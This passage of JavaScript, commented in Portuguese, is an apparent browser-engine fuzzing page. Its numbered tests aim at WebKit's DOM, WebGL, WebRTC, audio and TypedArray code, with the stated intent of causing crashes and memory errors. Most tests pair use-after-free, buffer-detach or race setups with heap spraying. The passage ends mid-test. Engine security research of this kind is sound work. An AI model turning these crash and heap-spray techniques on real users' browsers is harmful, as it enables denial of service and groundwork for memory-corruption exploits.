            try {
                // Concat tenta escrever 1, 2, 3 no novo array.
                // O novo array tem tamanho 0.
                // JS engines modernas tratam isso como defini√ß√£o de propriedade, mas vers√µes antigas...
                let res = arr.concat(trap);
                
                if (res.length === 3) { // O engine for√ßou o tamanho
                    log("Concat expandiu o array (Safe).", "success");
                } else {
                    log(`ALERTA: Tamanho inesperado: ${res.length}`, "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 144: Blob.text() Revocation Race ---
        // L√≥gica: Blob.text() retorna uma Promise.
        // Revogamos o Blob e o buffer subjacente imediatamente ap√≥s chamar text().
        function runTest144() {
            log("Iniciando Test 144: Blob Text Race...");
            
            let u8 = new Uint8Array(1024);
            u8.fill(65); // 'A'
            let blob = new Blob([u8]);
            
            // Inicia leitura ass√≠ncrona
            let p = blob.text();
            
            // Destroi a fonte
            log("Destruindo Blob...");
            u8 = null;
            blob = null; // Apenas remove ref JS, mas Engine deve segurar.
            sprayHeap();
            
            p.then(text => {
                if (text.length === 1024 && text[0] === 'A') {
                    log("Leitura √≠ntegra (Safe).", "success");
                } else {
                    log("ALERTA: Texto corrompido ou vazio!", "alert");
                }
            }).catch(e => log("Erro promessa: " + e));
        }
// ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 139: MessageChannel Entanglement Loop ---
        // L√≥gica: Criamos um ciclo de portas de mensagem.
        // Transferimos a Porta A pela Porta B, e a Porta B pela Porta A (se poss√≠vel ou em cadeia).
        // Fechamos a cadeia enquanto as mensagens est√£o em tr√¢nsito (na fila de eventos).
        function runTest139() {
            log("Iniciando Test 139: Channel Loop...");
            
            let mc1 = new MessageChannel();
            let mc2 = new MessageChannel();
            
            // Tenta criar um ciclo de refer√™ncias complexo
            // mc1.port1 envia mc2.port2
            // mc2.port1 envia mc1.port2
            
            try {
                mc1.port1.postMessage("cycle1", [mc2.port2]);
                mc2.port1.postMessage("cycle2", [mc1.port2]);
                
                log("Ciclo de portas criado. Fechando ra√≠zes...");
                
                // Fecha as portas restantes abruptamente
                // O WebKit tem que limpar as portas que est√£o "voando" nas mensagens
                mc1.port1.close();
                mc2.port1.close();
                
                // Spray para corromper a mem√≥ria das portas liberadas
                sprayHeap();
                
                // Tenta for√ßar GC
                mc1 = null;
                mc2 = null;
            } catch(e) {
                log("Erro: " + e.message);
            }
        }
 // ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 145: AudioNode Feedback Loop Destruction ---
        // L√≥gica: Criar um ciclo de feedback de √°udio (DelayNode -> GainNode -> DelayNode).
        // Isso for√ßa o motor de √°udio a processar blocos complexos.
        // Destru√≠mos o contexto e os n√≥s enquanto o feedback est√° ativo.
        function runTest145() {
            log("Iniciando Test 145: Audio Feedback...");
            
            try {
                let ctx = new (window.AudioContext || window.webkitAudioContext)();
                let osc = ctx.createOscillator();
                let delay = ctx.createDelay();
                let gain = ctx.createGain();
                
                // Configura feedback
                delay.delayTime.value = 0.1;
                gain.gain.value = 0.9;
                
                osc.connect(delay);
                delay.connect(gain);
                gain.connect(delay); // Ciclo fechado
                gain.connect(ctx.destination);
                
                osc.start();
                
                log("Feedback loop ativo. Detonando...");
                
                // Timer agressivo para destruir durante processamento
                setTimeout(() => {
                    // Desconecta tudo de forma desordenada
                    gain.disconnect();
                    delay.disconnect();
                    osc.stop();
                    
                    // Fecha contexto
                    ctx.close().then(() => log("Contexto fechado."));
                    
                    // Nuke references
                    ctx = null; osc = null; delay = null; gain = null;
                    
                    sprayHeap();
                }, 50);
                
            } catch(e) { log("Erro Audio: " + e); }
        }

        // --- TESTE 146: Web Animation Finish Event UAF ---
        // L√≥gica: A API Web Animation dispara evento 'finish'.
        // Se no evento 'finish' destruirmos o elemento e tentarmos reiniciar a anima√ß√£o
        // usando a refer√™ncia do objeto Animation (que aponta para o elemento morto)...
        function runTest146() {
            log("Iniciando Test 146: Animation UAF...");
            
            let div = document.createElement('div');
            document.body.appendChild(div);
            
            // Cria anima√ß√£o
            let anim = div.animate([
                { opacity: 0 }, { opacity: 1 }
            ], { duration: 10 });
            
            anim.onfinish = function() {
                log("Anima√ß√£o terminou. Destruindo elemento...");
                
                div.remove();
                sprayHeap();
                
                // O objeto 'anim' ainda existe e aponta para 'div' (que foi removido).
                // Tentar dar play novamente pode acessar a RenderLayer do elemento morto.
                try {
                    log("Reiniciando anima√ß√£o em elemento morto...");
                    anim.play(); 
                    
                    // Acessa timeline
                    let t = anim.currentTime;
                    log("Tempo atual: " + t);
                } catch(e) { log("Erro: " + e); }
            };
        }

        // --- TESTE 147: Table Section Row Migration Crash ---
        // L√≥gica: Tabelas t√™m se√ß√µes (Head, Body, Foot).
        // Mover uma linha (Row) de uma se√ß√£o para outra *enquanto* for√ßamos layout.
        // O renderizador de tabelas √© not√≥rio por bugs de ponteiro pai.
        function runTest147() {
            log("Iniciando Test 147: Table Thrash...");
            
            let table = document.createElement('table');
            let thead = table.createTHead();
            let tbody = table.createTBody();
            let row = thead.insertRow();
            row.insertCell().innerText = "Move Me";
            
            document.body.appendChild(table);
            
            // For√ßa layout inicial
            table.offsetWidth;
            
            log("Movendo linha entre se√ß√µes...");
            
            // Remove do head e insere no body
            // Mas fazemos isso manipulando o DOM diretamente, confundindo a estrutura da tabela
            thead.removeChild(row);
            
            // Spray imediato
            sprayHeap();
            
            // Insere no body
            tbody.appendChild(row);
            
            // For√ßa layout IMEDIATAMENTE ap√≥s a migra√ß√£o suja
            try {
                // Acessar offsetTop da c√©lula for√ßa c√°lculo.
                // O renderizador pode achar que a c√©lula ainda est√° no thead.
                let top = row.cells[0].offsetTop;
                log("Offset lido: " + top);
            } catch(e) { log("Erro: " + e); }
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS
        // ==========================================

        // --- TESTE 148: Intl.Collator Stale Pointer ---
        // L√≥gica: 'compare' usa strings. Se passarmos um objeto que muda a string
        // subjacente durante a convers√£o para string...
        // O Collator pode ter cacheado o ponteiro da string antiga.
        function runTest148() {
            log("Iniciando Test 148: Intl.Collator...");
            
            if (!window.Intl) { log("Intl n√£o suportado."); return; }
            
            let collator = new Intl.Collator();
            let str = "AAAA";
            
            let evilObj = {
                toString: function() {
                    log("Collator pediu string. Mudando refer√™ncia...");
                    str = "BBBB"; // Muda a string original
                    sprayHeap();
                    return "B";
                }
            };
            
            try {
                // Compara str (AAAA) com evilObj (B).
                // Se o Collator pegou o ponteiro de 'str' antes de chamar 'toString' do evilObj,
                // e o sprayHeap moveu 'str' ou reescreveu a mem√≥ria...
                let res = collator.compare(str, evilObj);
                
                log("Compara√ß√£o feita: " + res, "success");
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 149: Array Concat Spreadable Trap ---
        // L√≥gica: 'concat' verifica 'Symbol.isConcatSpreadable'.
        // Podemos usar um getter para esse s√≠mbolo.
        // Se no getter alterarmos o array que est√° sendo concatenado (ex: zerando-o),
        // o 'concat' pode tentar ler √≠ndices que n√£o existem mais.
        function runTest149() {
            log("Iniciando Test 149: Concat Spreadable...");
            
            let arr = [1, 2, 3, 4];
            let trap = {};
            
            Object.defineProperty(trap, Symbol.isConcatSpreadable, {
                get: function() {
                    log("Concat checando Spreadable. Zerando array...");
                    arr.length = 0; // Esvazia o array original
                    sprayHeap();
                    return true;
                }
            });
            
            // Adiciona propriedades para serem "espalhadas"
            trap.length = 2;
            trap[0] = 9;
            trap[1] = 9;
            
            try {
                // concat(arr, trap) -> L√™ arr, depois l√™ trap.
                // Mas e se for concat(trap, arr)?
                // Vamos tentar: [].concat(arr, trap)
                // O motor itera 'arr', depois consulta 'trap'.
                // Quando consulta 'trap', 'arr' √© zerado.
                // O resultado final cont√©m os itens de 'arr' (j√° copiados) e 'trap'?
                // Ou o motor tenta acessar 'arr' novamente?
                
                let res = [].concat(trap, arr);
                
                // Se arr foi zerado, ele n√£o deveria aparecer no resultado se lido DEPOIS.
                log("Length final: " + res.length, "success");
                
                // Verifica se h√° undefineds ou lixo
                if (res.length > 2 && res[2] === undefined) {
                    log("ALERTA: Array cont√©m buracos inesperados!", "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 150: Promise.race Proxy Confusion ---
        // L√≥gica: Promise.race aceita um iter√°vel.
        // Usamos um iterador customizado que detona a mem√≥ria quando o motor pede a pr√≥xima Promise.
        function runTest150() {
            log("Iniciando Test 150: Promise Race...");
            
            let ab = new ArrayBuffer(128);
            let u8 = new Uint8Array(ab);
            u8.fill(0x55);
            
            let iterable = {
                [Symbol.iterator]: function* () {
                    yield new Promise(r => r(1));
                    
                    log("Race pediu segunda Promise. Detachando buffer...");
                    try {
                         let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                         w.postMessage(ab, [ab]);
                    } catch(e) {}
                    sprayHeap();
                    
                    yield new Promise(r => r(2));
                }
            };
            
            try {
                Promise.race(iterable).then(val => {
                    log("Race venceu: " + val, "success");
                    // Verifica se o buffer morreu
                    if (u8.length === 0) {
                        log("Buffer detachado corretamente.", "success");
                    } else {
                         // Se o buffer sobreviveu mas est√° vazio/lixo
                         log("ALERTA: Buffer sobreviveu ao detach!", "alert");
                    }
                });
            } catch(e) { log("Erro: " + e); }
        }
 // ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 151: WebGL Shader Compiler Race ---
        // L√≥gica: Compilar shaders √© uma tarefa pesada que envolve o driver da GPU.
        // Se mandarmos compilar um shader complexo e destruirmos o contexto WebGL
        // imediatamente (enquanto o driver trabalha em background), podemos causar um crash no driver.
        function runTest151() {
            log("Iniciando Test 151: Shader Race...");
            
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl');
            if (!gl) { log("WebGL ausente."); return; }
            
            let vs = gl.createShader(gl.VERTEX_SHADER);
            
            // Shader massivo e in√∫til para ocupar o compilador
            let src = "attribute vec4 p; void main() { gl_Position = p;";
            for(let i=0; i<2000; i++) src += "gl_Position += vec4(0.0001);";
            src += "}";
            
            log("Enviando shader complexo...");
            gl.shaderSource(vs, src);
            
            // Trigger
            setTimeout(() => {
                log("Destruindo contexto durante compila√ß√£o...");
                let ext = gl.getExtension('WEBGL_lose_context');
                if (ext) ext.loseContext();
                
                // Nuke objects
                gl.deleteShader(vs);
                gl = null;
                c.width = 0;
                
                sprayHeap();
            }, 0);
            
            // Inicia compila√ß√£o
            gl.compileShader(vs);
        }

        // --- TESTE 152: DOM insertBefore Reference Nuke ---
        // L√≥gica: node.insertBefore(newNode, refNode).
        // Se no evento de inser√ß√£o de 'newNode', n√≥s removermos o 'refNode'...
        // O motor C++ precisa saber onde inserir. Se a refer√™ncia sumiu, ele aponta para onde?
        function runTest152() {
            log("Iniciando Test 152: InsertBefore Nuke...");
            
            let parent = document.createElement('div');
            let refNode = document.createElement('div');
            let newNode = document.createElement('div');
            
            parent.appendChild(refNode);
            document.body.appendChild(parent);
            
            newNode.addEventListener('DOMNodeInserted', () => {
                log("Inser√ß√£o detectada! Removendo n√≥ de refer√™ncia...");
                // Remove o n√≥ que serve de √¢ncora para a inser√ß√£o
                parent.removeChild(refNode);
                refNode = null;
                sprayHeap();
            });
            
            try {
                log("Executando insertBefore...");
                // O motor verifica se refNode √© filho de parent. Sim.
                // Dispara evento. RefNode morre.
                // O motor tenta finalizar a inser√ß√£o antes de...?
                parent.insertBefore(newNode, refNode);
                log("Inser√ß√£o conclu√≠da.");
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 153: Canvas MeasureText Font Clear ---
        // L√≥gica: measureText() usa a fonte atual.
        // Se usarmos uma fonte que est√° carregando e limparmos o cache de fontes
        // no exato momento que o canvas tenta calcular a geometria do glifo...
        function runTest153() {
            log("Iniciando Test 153: MeasureText Font...");
            
            let font = new FontFace('TestFont', 'url(data:font/woff;base64,AAAA)');
            document.fonts.add(font);
            
            let canvas = document.createElement('canvas');
            let ctx = canvas.getContext('2d');
            ctx.font = '40px TestFont';
            
            font.load().catch(() => {}); // Inicia load
            
            log("Medindo texto e limpando fontes...");
            
            // Tenta criar condi√ß√£o de corrida
            for(let i=0; i<100; i++) {
                ctx.measureText("A"); // Acessa engine de texto
                if (i === 50) {
                    document.fonts.clear(); // Destroi fontes
                    sprayHeap();
                }
            }
            log("Loop finalizado.");
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS
        // ==========================================

        // --- TESTE 154: Sparse Array Reverse Hole Leak ---
        // L√≥gica: Arrays esparsos (com buracos) t√™m otimiza√ß√µes de mem√≥ria.
        // Ao inverter (reverse) um array esparso grande, o algoritmo pode falhar
        // em checar se o √≠ndice destino existe, lendo mem√≥ria n√£o inicializada.
        function runTest154() {
            log("Iniciando Test 154: Sparse Reverse...");
            
            // Array com buracos: [1, (hole), (hole), ..., 2]
            let arr = [1];
            arr[1000] = 2; 
            
            // Proxy no prot√≥tipo para detectar leituras estranhas
            let proto = {};
            Object.setPrototypeOf(arr, new Proxy(Array.prototype, {
                get: function(target, prop, receiver) {
                    if (typeof prop === 'string' && !isNaN(prop)) {
                        // Se o algoritmo de reverse tentar ler um buraco via prot√≥tipo
                        // e n√≥s retornarmos algo, podemos confundir a troca?
                    }
                    return Reflect.get(target, prop, receiver);
                }
            }));
            
            try {
                arr.reverse();
                
                // Verifica se algum buraco foi preenchido com lixo
                let foundGarbage = false;
                for(let i=1; i<1000; i++) {
                    if (arr[i] !== undefined) {
                        foundGarbage = true;
                        log(`ALERTA: Buraco preenchido com: ${arr[i]}`, "alert");
                        break;
                    }
                }
                
                if(!foundGarbage) log("Array √≠ntegro (Safe).", "success");
                
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 155: URI Decode Buffer Overflow ---
        // L√≥gica: decodeURIComponent com sequ√™ncias malformadas (%E0 sem continua√ß√£o).
        // Se causarmos uma exce√ß√£o de mem√≥ria (OOM) durante a decodifica√ß√£o,
        // o buffer de string tempor√°rio pode vazar?
        function runTest155() {
            log("Iniciando Test 155: URI Decode...");
            
            // Sequ√™ncia incompleta repetida massivamente
            let badUri = "%E0".repeat(100000); 
            
            try {
                // Isso deve lan√ßar URIError.
                // Mas se o motor tentar alocar buffer antes de validar...
                let res = decodeURIComponent(badUri);
                log("Decodifica√ß√£o completou (Estranho).");
            } catch(e) {
                if (e instanceof URIError) {
                    log("URIError capturado (Safe).", "success");
                } else {
                    log("ALERTA: Erro inesperado: " + e, "alert");
                }
            }
        }

        // --- TESTE 156: DataView Endianness Confusion ---
        // L√≥gica: DataView permite ler Little ou Big Endian.
        // O argumento 'littleEndian' √© booleano. Se passarmos um objeto com getter
        // que altera o buffer subjacente quando lido...
        function runTest156() {
            log("Iniciando Test 156: Endianness Trap...");
            
            let ab = new ArrayBuffer(8);
            let dv = new DataView(ab);
            
            let endianTrap = {
                valueOf: function() {
                    log("Lendo Endianness. Detachando...");
                    try {
                         let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                         w.postMessage(ab, [ab]);
                    } catch(e) {}
                    sprayHeap();
                    return true; // Little Endian
                }
            };
            
            try {
                // getFloat64(offset, littleEndian)
                // O motor l√™ o offset, depois converte o littleEndian.
                // Se a convers√£o detonar o buffer...
                let val = dv.getFloat64(0, endianTrap);
                
                // Se leu algo do buffer morto
                if (Number.isNaN(val) && val !== 0) {
                     log("Leitura segura (NaN/0).", "success");
                } else {
                     log(`ALERTA: Valor lido de buffer morto: ${val}`, "alert");
                }
            } catch(e) {
                log("Erro esperado: " + e.message, "success");
            }
        }
 // ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 157: RTCPeerConnection Signaling Race ---
        // L√≥gica: WebRTC opera em threads separadas para rede.
        // Criamos uma conex√£o e fechamos ela ("close()") DENTRO do callback
        // que gera candidatos de rede (onicecandidate).
        // Isso pode causar Use-After-Free na thread de sinaliza√ß√£o.
        function runTest157() {
            log("Iniciando Test 157: WebRTC Race...");
            
            if (!window.RTCPeerConnection) { log("WebRTC n√£o suportado."); return; }
            
            try {
                let pc = new RTCPeerConnection();
                
                pc.onicecandidate = function(e) {
                    log("Candidato ICE gerado. Destruindo conex√£o...");
                    
                    // A thread de rede est√° acessando 'pc' para entregar o evento.
                    // N√≥s fechamos e limpamos a refer√™ncia na thread principal.
                    pc.close();
                    pc = null;
                    sprayHeap();
                    
                    // Tenta criar carga na thread de rede
                    try {
                        let pc2 = new RTCPeerConnection();
                        pc2.createDataChannel("chaos");
                    } catch(err){}
                };
                
                // Inicia negocia√ß√£o
                pc.createDataChannel("test");
                pc.createOffer().then(offer => pc.setLocalDescription(offer));
                
                log("Oferta criada. Aguardando candidatos...");
            } catch(e) { log("Erro WebRTC: " + e); }
        }

        // --- TESTE 158: SVG Marker Cyclic Reference ---
        // L√≥gica: Marcadores SVG (<marker>) podem ser aplicados a linhas.
        // Se um marcador contiver uma linha que usa O PR√ìPRIO marcador,
        // criamos uma recurs√£o infinita de renderiza√ß√£o.
        function runTest158() {
            log("Iniciando Test 158: SVG Marker Cycle...");
            
            let svg = document.createElementNS("http://www.w3.org/2000/svg", "svg");
            let defs = document.createElementNS("http://www.w3.org/2000/svg", "defs");
            
            let marker = document.createElementNS("http://www.w3.org/2000/svg", "marker");
            marker.id = "crash-marker";
            marker.setAttribute("markerWidth", "10");
            marker.setAttribute("markerHeight", "10");
            marker.setAttribute("refX", "5");
            marker.setAttribute("refY", "5");
            
            // O conte√∫do do marcador √© uma linha...
            let line = document.createElementNS("http://www.w3.org/2000/svg", "line");
            line.setAttribute("x1", "0");
            line.setAttribute("y1", "0");
            line.setAttribute("x2", "10");
            line.setAttribute("y2", "10");
            line.setAttribute("stroke", "red");
            
            // ...que usa o PR√ìPRIO marcador no final!
            line.setAttribute("marker-end", "url(#crash-marker)");
            
            marker.appendChild(line);
            defs.appendChild(marker);
            svg.appendChild(defs);
            
            // Elemento vis√≠vel que inicia o ciclo
            let triggerLine = document.createElementNS("http://www.w3.org/2000/svg", "line");
            triggerLine.setAttribute("x1", "0");
            triggerLine.setAttribute("y1", "0");
            triggerLine.setAttribute("x2", "100");
            triggerLine.setAttribute("y2", "100");
            triggerLine.setAttribute("stroke", "blue");
            triggerLine.setAttribute("marker-end", "url(#crash-marker)");
            
            svg.appendChild(triggerLine);
            document.body.appendChild(svg);
            
            log("Ciclo SVG injetado. Aguardando render...");
            
            // For√ßa layout
            setTimeout(() => {
                svg.remove();
                log("Teste 158 fim.");
            }, 2000);
        }

        // --- TESTE 159: TextTrackCue List Mutation UAF ---
        // L√≥gica: V√≠deos HTML5 t√™m faixas de texto (legendas).
        // Se removermos uma faixa (<track>) enquanto iteramos suas Cues (legendas),
        // o iterador interno C++ pode falhar.
        function runTest159() {
            log("Iniciando Test 159: TextTrack UAF...");
            
            let video = document.createElement('video');
            let track = video.addTextTrack("captions", "English", "en");
            track.mode = "showing";
            
            // Adiciona muitas cues
            for(let i=0; i<50; i++) {
                track.addCue(new VTTCue(i, i+1, "Text " + i));
            }
            
            // Tenta acessar e remover
            let cues = track.cues;
            log("Iterando cues...");
            
            try {
                // Acessa um √≠ndice
                let c = cues[10];
                
                // Remove a faixa inteira do v√≠deo
                // Isso deve invalidar a lista 'cues'
                track.mode = "disabled";
                video.remove();
                
                sprayHeap();
                
                // Tenta acessar a lista morta
                // Se o objeto JS 'cues' mantiver ponteiro para o objeto C++ Track morto...
                log("Acesso p√≥s-morte (Length): " + cues.length);
                let zombieCue = cues[20];
                if (zombieCue) log("Zombie Cue: " + zombieCue.text);
                
            } catch(e) { log("Erro: " + e.message); }
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS
        // ==========================================

        // --- TESTE 160: TypedArray.set() Overlap Detach ---
        // L√≥gica: 'target.set(source)'. Se source e target forem visualiza√ß√µes do MESMO buffer,
        // o motor precisa lidar com sobreposi√ß√£o (copiar para temp).
        // Se usarmos um getter no meio para desconectar o buffer...
        function runTest160() {
            log("Iniciando Test 160: TypedArray Set...");
            
            let ab = new ArrayBuffer(1024);
            let u8 = new Uint8Array(ab);
            u8.fill(0xAA);
            
            // Objeto 'source' falso
            let source = {
                length: 512,
                // O motor vai ler os elementos 0, 1, 2...
                // Usamos um Proxy ou getter num √≠ndice para explodir
                [0]: 1,
                get [1]() {
                    log("Lendo √≠ndice 1. Detachando...");
                    try {
                        let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                        w.postMessage(ab, [ab]);
                    } catch(e) {}
                    sprayHeap();
                    return 2;
                }
            };
            
            try {
                // Tenta copiar 'source' para 'u8'
                u8.set(source);
                
                // Se u8 sobreviveu e tem dados estranhos
                if (u8.length === 0) {
                    log("Buffer detachado (Safe).", "success");
                } else if (u8[0] === 1 && u8[1] === 2) {
                     log("Escrita bem sucedida (Estranho).", "info");
                } else {
                     log("ALERTA: Estado inconsistente!", "alert");
                }
            } catch(e) {
                log("Erro esperado: " + e.message, "success");
            }
        }

        // --- TESTE 161: Map Iterator Invalid Access ---
        // L√≥gica: Iterar um Map. Deletar o item atual. Adicionar novo item.
        // O iterador deve ser robusto. Em engines antigas, isso causava leitura de slots inv√°lidos.
        function runTest161() {
            log("Iniciando Test 161: Map Iterator...");
            
            let map = new Map();
            map.set('a', 1);
            map.set('b', 2);
            
            let iter = map.keys();
            let step = iter.next(); // 'a'
            
            log("Deletando e readicionando chaves...");
            map.delete('a');
            map.delete('b');
            sprayHeap();
            map.set('c', 3); // Reutiliza slot de mem√≥ria?
            
            try {
                // Pr√≥ximo passo do iterador antigo
                let next = iter.next();
                
                // Deveria ser 'c' ou done.
                // Se retornar 'b' (que foi deletado) ou lixo...
                log("Valor iterador: " + next.value);
                
                if (next.value === 'b') {
                    log("ALERTA: Iterador retornou item deletado!", "alert");
                } else {
                    log("Iterador seguro.", "success");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 162: Proxy Revocable Handler Leak ---
        // L√≥gica: Proxy.revocable cria um proxy e uma fun√ß√£o revoke.
        // Revogamos o proxy. O handler original deve ser liberado.
        // Tentamos acessar o handler liberado atrav√©s de truques de prot√≥tipo?
        // Ou verificar se a mem√≥ria do handler foi zerada.
        function runTest162() {
            log("Iniciando Test 162: Proxy Leak...");
            
            let handler = {
                get: function() { return "leaked"; }
            };
            
            let p = Proxy.revocable({}, handler);
            
            // Revoga
            p.revoke();
            log("Proxy revogado.");
            
            // Tenta acessar atrav√©s do proxy morto
            try {
                let x = p.proxy.foo;
                log("ALERTA: Proxy morto respondeu! " + x, "alert");
            } catch(e) {
                // Erro √© esperado (TypeError)
                if (e instanceof TypeError) {
                    log("TypeError capturado (Safe).", "success");
                } else {
                    log("ALERTA: Erro incorreto: " + e, "alert");
                }
            }
            
            // Check de mem√≥ria: Se o handler foi liberado, sprayHeap deve ter sobrescrito.
            handler = null;
            p = null;
            sprayHeap();
        }
// ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 163: WebGL Buffer Orphan Race ---
        // L√≥gica: 'bufferData' envia dados para a GPU. Se chamarmos isso com tamanho grande
        // e imediatamente deletarmos o buffer ou o contexto, o driver pode tentar acessar
        // o ponteiro do buffer deletado durante a transfer√™ncia DMA.
        function runTest163() {
            log("Iniciando Test 163: WebGL Buffer Race...");
            
            let c = document.createElement('canvas');
            let gl = c.getContext('webgl');
            if(!gl) { log("WebGL ausente."); return; }
            
            let buf = gl.createBuffer();
            gl.bindBuffer(gl.ARRAY_BUFFER, buf);
            
            // Aloca 10MB
            let size = 1024 * 1024 * 10;
            let data = new Uint8Array(size).fill(0xFF);
            
            log("Iniciando upload massivo e deletando...");
            
            // Race Condition
            try {
                // Inicia upload
                gl.bufferData(gl.ARRAY_BUFFER, data, gl.STATIC_DRAW);
                
                // Imediatamente tenta "perder" o contexto e deletar o recurso
                setTimeout(() => {
                     let ext = gl.getExtension('WEBGL_lose_context');
                     if(ext) ext.loseContext();
                     gl.deleteBuffer(buf);
                     gl = null;
                     sprayHeap();
                }, 0);
                
                // For√ßa flush
                gl.finish();
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 164: CSS Variable Recursive Explosion ---
        // L√≥gica: Vari√°veis CSS podem referenciar outras.
        // Criamos um ciclo curto (--a ref --b, --b ref --a) e aplicamos a milhares de elementos.
        // For√ßamos o layout. O detector de ciclos do WebKit pode estourar a pilha (Stack Overflow).
        function runTest164() {
            log("Iniciando Test 164: CSS Stack Overflow...");
            
            let style = document.createElement('style');
            style.textContent = `
                .crash {
                    --a: var(--b);
                    --b: var(--a);
                    width: var(--a);
                }
            `;
            document.head.appendChild(style);
            
            let root = document.createElement('div');
            document.body.appendChild(root);
            
            // Cria profundidade DOM
            for(let i=0; i<2000; i++) {
                let d = document.createElement('div');
                d.className = 'crash';
                root.appendChild(d);
            }
            
            log("For√ßando c√°lculo de estilo recursivo...");
            
            // Acesso s√≠ncrono que for√ßa o Style Resolver a rodar
            try {
                // Tenta ler propriedade computada
                let s = getComputedStyle(root.firstChild).width;
                log("Sobreviveu (Ciclo detectado). " + s);
            } catch(e) { log("Erro: " + e); }
            
            // Limpeza
            setTimeout(() => {
                root.remove();
                style.remove();
            }, 1000);
        }

        // --- TESTE 165: ProcessingInstruction Node UAF ---
        // L√≥gica: 'ProcessingInstruction' (ex: <?xml ... ?>) √© um n√≥ raro.
        // Ele tem ciclo de vida diferente de Elementos.
        // Manipular 'data' desse n√≥ enquanto o movemos entre documentos.
        function runTest165() {
            log("Iniciando Test 165: PI Node UAF...");
            
            let pi = document.createProcessingInstruction("target", "data");
            document.body.appendChild(pi);
            
            let observer = new MutationObserver(() => {
                log("PI modificado. Removendo...");
                pi.remove();
                pi = null;
                sprayHeap();
            });
            observer.observe(document.body, {childList: true, subtree: true, characterData: true});
            
            try {
                log("Alterando dados do PI...");
                // Dispara muta√ß√£o CharacterData
                pi.data = "new data";
                
                // Se o motor tentar ler 'pi' ap√≥s o evento...
                log("Altera√ß√£o conclu√≠da.");
            } catch(e) { log("Erro: " + e); }
        }

        // ==========================================
        // GRUPO 2: SILENT VECTORS
        // ==========================================

        // --- TESTE 166: Sparse Array Map Hole Leak ---
        // L√≥gica: Arrays criados com 'new Array(n)' s√£o esparsos (buracos).
        // Se usarmos 'map', o motor cria um novo array.
        // Se alterarmos o array original (tornando-o denso ou deletando prot√≥tipo) durante o map,
        // o motor pode ler mem√≥ria n√£o inicializada dos buracos.
        function runTest166() {
            log("Iniciando Test 166: Sparse Array Leak...");
            
            let arr = new Array(100);
            arr[0] = "start"; // For√ßa tipo objeto/misto
            
            // Define getter no prot√≥tipo para capturar acesso aos buracos
            Object.defineProperty(Array.prototype, "0", {
                get: function() { return "proto"; },
                configurable: true
            });
            
            try {
                let res = arr.map((v, i) => {
                    if (i === 0) {
                        log("Map iniciado. Deletando prot√≥tipo...");
                        delete Array.prototype["0"]; // Remove fallback
                        sprayHeap();
                    }
                    return v;
                });
                
                // Verifica √≠ndices que eram buracos
                // Eles deveriam ser 'undefined' agora que o proto foi limpo.
                // Se contiverem lixo, √© leak.
                let leak = false;
                for(let i=1; i<10; i++) {
                    if (res[i] !== undefined) {
                        log(`ALERTA: Buraco ${i} cont√©m: ${res[i]}`, "alert");
                        leak = true;
                    }
                }
                if (!leak) log("Array seguro.", "success");
                
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 167: RegExp Named Group Offset Confusion ---
        // L√≥gica: RegExp com grupos nomeados (?<name>...).
        // Se a string mudar durante a execu√ß√£o (via lastIndex com efeito colateral),
        // o motor pode calcular o offset do grupo nomeado incorretamente.
        function runTest167() {
            log("Iniciando Test 167: RegExp Offset...");
            
            let re = /(?<grp>A+)/y;
            let str = "AAAAAA";
            
            re.lastIndex = {
                valueOf: function() {
                    log("lastIndex acessado. Encolhendo string...");
                    str = "A"; // Reduz drasticamente
                    sprayHeap();
                    return 0;
                }
            };
            
            try {
                let match = re.exec(str);
                
                if (match && match.groups && match.groups.grp) {
                    // O grupo capturado corresponde ao que est√° na mem√≥ria?
                    let g = match.groups.grp;
                    log(`Captura: "${g}"`);
                    
                    // Se capturou algo que n√£o est√° mais na string (acesso OOB)
                    if (g.length > str.length) {
                        log("ALERTA: Captura maior que a string!", "alert");
                    } else {
                        log("RegExp seguro.", "success");
                    }
                } else {
                    log("Sem match (Safe).", "success");
                }
            } catch(e) { log("Erro: " + e); }
        }

        // --- TESTE 168: TypedArray Subarray Detach ---
        // L√≥gica: 'subarray' cria uma view. Se usarmos um construtor de esp√©cie (Symbol.species)
        // que desconecta o buffer pai...
        function runTest168() {
            log("Iniciando Test 168: Subarray Detach...");
            
            let ab = new ArrayBuffer(1024);
            let u8 = new Uint8Array(ab);
            u8.fill(0x55);
            
            // Hook no construtor
            u8.constructor = {
                [Symbol.species]: function(len) {
                    log("Species chamado. Matando buffer...");
                    try {
                        let w = new Worker(URL.createObjectURL(new Blob([""],{type:'text/js'})));
                        w.postMessage(ab, [ab]);
                    } catch(e){}
                    sprayHeap();
                    // Retorna view v√°lida mas apontando pra nada?
                    return new Uint8Array(len); 
                }
            };
            
            try {
                // subarray chama Species para criar a nova view
                // O WebKit pode tentar copiar propriedades ou configurar offsets do buffer velho (agora morto)
                let sub = u8.subarray(0, 10);
                
                log("Subarray criado. Length: " + sub.length);
                if (sub.buffer.byteLength === 0) {
                     log("Buffer do subarray est√° vazio (Safe).", "success");
                } else {
                     log("ALERTA: Buffer fantasma detectado!", "alert");
                }
            } catch(e) { log("Erro: " + e); }
        }
// ==========================================
        // GRUPO 1: CRASH VECTORS
        // ==========================================

        // --- TESTE 169: Canvas putImageData Detach Race ---
        // L√≥gica: putImageData l√™ pixels de um Uint8ClampedArray.
        // Se detacharmos o buffer desse array (via Worker) NO MEIO da leitura pelo Canvas...
